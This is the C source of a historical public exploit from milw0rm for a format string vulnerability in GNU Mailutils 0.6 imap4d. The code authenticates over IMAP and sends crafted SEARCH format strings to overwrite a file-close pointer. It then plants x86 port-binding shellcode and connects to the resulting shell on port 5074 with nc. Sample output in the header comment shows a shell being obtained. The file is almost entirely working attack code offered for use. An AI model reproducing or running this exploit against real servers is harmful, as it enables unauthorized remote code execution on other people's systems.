/*
 *  GNU Mailutils 0.6 imap4d 'search' format string exploit.
 *  Ref: www.idefense.com/application/poi/display?id=303&type=vulnerabilities
 *
 *  This silly exploit uses hardcoded values taken from GNU/Debian testing (etch).
 *
 *  $ ./imap4d_search_expl -h 127.0.0.1 -p 143 -u clem1 -s PROUT
 *  [+] GNU Mailutils 0.6 imap4d 'search' format string exploit.
 *  [+] By clem1.
 *  [+] connecting to: 127.0.0.1:143
 *  [+] authentification: completed.
 *  [+] format string: sended
 *  [+] shellcode sended.
 *  [+] Bingo.
 *  
 *  id;      
 *  uid=1000(clem1) gid=1002(mail) groups=0(root)
 *
 *  Copyright (C) 2005 Clement Lecigne - clem1 @ badcode.info.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <getopt.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

struct values {
	int offset;
	int IO_file_close;
	int addr;
	char mailbox[32];
} v = {
	11,
	0x40468bc4,
	0x80906e0, //0xaabbccdd
	"inbox"
};

void usage(char *);
void auth(int, char *, char *);
void sendsc(int);
void owned(int, char *);
void fmtbuild(int);

/*
 * s0t4ipv6@Shellcode.com.ar
 * x86 portbind a shell in port 5074
 */
char sc[] = "\x31\xc0\x50\x40\x89\xc3\x50\x40"
	    "\x50\x89\xe1\xb0\x66\xcd\x80\x31"
	    "\xd2\x52\x66\x68\x13\xd2\x43\x66"
	    "\x53\x89\xe1\x6a\x10\x51\x50\x89"
	    "\xe1\xb0\x66\xcd\x80\x40\x89\x44"
	    "\x24\x04\x43\x43\xb0\x66\xcd\x80"
	    "\x83\xc4\x0c\x52\x52\x43\xb0\x66"
	    "\xcd\x80\x93\x89\xd1\xb0\x3f\xcd"
	    "\x80\x41\x80\xf9\x03\x75\xf6\x52"
	    "\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
	    "\x62\x69\x89\xe3\x52\x53\x89\xe1"
	    "\xb0\x0b\xcd\x80";

char b[1024];
int i;

int main(int ac, char **av){
	char o, *host, *user, *pass;
	struct hostent *h;
	struct sockaddr_in s;
	int port, fd;
	
	puts("[+] GNU Mailutils 0.6 imap4d 'search' format string exploit.");
	puts("[+] By clem1.");

	if(ac != 9) usage(av[0]);
	
	while((o = getopt(ac,av,"h:p:u:s:")) != EOF) {
		switch (o) {
			case 'h':
				host = optarg;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'u':
				user = optarg;
				break;
			case 's':
				pass = optarg;
				break;
			default:
				usage(av[0]);
				break;
		}
	}
	if((h = gethostbyname(host)) == NULL) {
		herror("[-] gethostbyname()");
		exit(1);
        }
	
	printf("[+] connecting to: %s:%d\n", inet_ntoa(*((struct in_addr *)h->h_addr)), port);

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd == -1){
		perror("[-] socket()");
		exit(1);
	}

	s.sin_family = AF_INET;
	s.sin_port = htons(port);
	s.sin_addr = *((struct in_addr *)h->h_addr);
	bzero(&(s.sin_zero), 8);

	if (connect(fd, (struct sockaddr *)&s, sizeof s) == -1) {
		perror("[-] connect()");
		exit(1);
	}

	i = recv(fd, b, 1023, 0);
	b[i] = 0;
	if(strstr(b, "IMAP4rev1") == NULL){
		puts("[-] failled.");
		exit(1);
	}
	/* authentification. */
	auth(fd, user, pass);
	/* build and send evil format string. */
	fmtbuild(fd);
	/* store shellcode in imap4d rwx adresse space. */
	sendsc(fd);
	/* force a call to fclose, uhm no shellcode ;> */
	owned(fd, host);
	return 0;
}

void auth(int fd, char *user, char *pass){
	memset(b, 0x0, 1024);
	snprintf(b, 1023, "1 LOGIN \"%s\" \"%s\"\n", user, pass);
	if(send(fd, b, strlen(b), 0) == -1){
		perror("[-] send()");
		exit(1);
	}
	memset(b, 0x0, 1024);
	i = recv(fd, b, 1023, 0);
	b[i] = 0x0;
	if(strstr(b, "Completed") == NULL){
		puts("[-] LOGIN failled.");
		exit(1);
	}
	memset(b, 0x0, 1024);
	snprintf(b, 1023, "2 SELECT \"%s\"\n", v.mailbox);
	if(send(fd, b, strlen(b), 0) == -1){
		perror("[-] send()");
		exit(1);
	}
	memset(b, 0x0, 1024);
	while((i = recv(fd, b, 1023, 0)) != -1){
		b[i] = 0x0;
		if(strstr(b, "Completed") != NULL)
			break;
		if(strstr(b, "Couldn't") != NULL){
			puts("[-] SELECT failled.");
			exit(1);
		}
	}
	puts("[+] authentification: completed.");
	return;
}

void sendsc(int fd){
	memset(b, 0x41, 1024);
	memcpy(b + 900, sc, strlen(sc));
	memcpy(b + 1020, " A\n", 3);
	memcpy(b, "3 LIST ", 7);
	if(send(fd, b, strlen(b), 0) == -1){
		perror("[-] send()");
		exit(1);
	}
	memset(b, 0x0, 1024);
	while((i = recv(fd, b, 1023, 0)) != -1){
		b[i] = 0x0;
		if(strstr(b, "Completed") != NULL)
			break;
		if(strstr(b, "BAD") != NULL){
			puts("[-] LIST failled.");
			exit(1);
		}
	}
	puts("[+] shellcode sended.");
	return;
}

void fmtbuild(int fd){
	unsigned char b0, b1, b2, b3;
	int a1, a2;
	a1 = (v.addr & 0xffff0000) >> 16;
	a2 = (v.addr & 0x0000ffff);
	b0 = (v.IO_file_close >> 24) & 0xff;
	b1 = (v.IO_file_close >> 16) & 0xff;
	b2 = (v.IO_file_close >> 8) & 0xff;
	b3 = (v.IO_file_close) & 0xff;
	snprintf(b, sizeof b,     "3 SEARCH TOPIC "
				  "A" /* pad. */
				  "%c%c%c%c" 
				  "%%.%hdx"
				  "%%%d$hn\n",
				  b3 + 2, b2, b1, b0,
				  a1 - 0x24,
				  v.offset);
	if(send(fd, b, strlen(b), 0) == -1){
		perror("[-] send()");
		exit(1);
	}
	while((i = recv(fd, b, 1023, 0)) != -1){
		b[i] = 0x0;
		if(strstr(b, "BAD") != NULL)
			break;
	}
	memset(b, 0x0, 1024);
	snprintf(b, sizeof b,     "3 SEARCH TOPIC "
				  "A" /* pad. */
				  "%c%c%c%c" 
				  "%%.%hdx"
				  "%%%d$hn\n",
				  b3, b2, b1, b0,
				  a2 - 0x24,
				  v.offset);
	if(send(fd, b, strlen(b), 0) == -1){
		perror("[-] send()");
		exit(1);
	}
	while((i = recv(fd, b, 1023, 0)) != -1){
		b[i] = 0x0;
		if(strstr(b, "BAD") != NULL)
			break;
	}
	puts("[+] format string: sended");
	return;
}

void owned(int fd, char *host){
	memset(b, 0x0, 1024);
	snprintf(b, 1023, "3 SUBSCRIBE OWNED\n");
	if(send(fd, b, strlen(b), 0) == -1){
		perror("[-] send()");
		exit(1);
	}
	puts("[+] Bingo.\n");
	sleep(1);
	execl("/bin/nc", "prout", host, "5074", NULL);
	printf("[-] muh? where is nc?\n[+] A shell is waiting you on %s:5074.\n", host);
	return;	
}

void usage(char *ex){
	printf("usage: %s -h <hostname> -p <port> -u <user> -s <password>\n", ex);
	exit(1);
}

// milw0rm.com [2005-09-10]
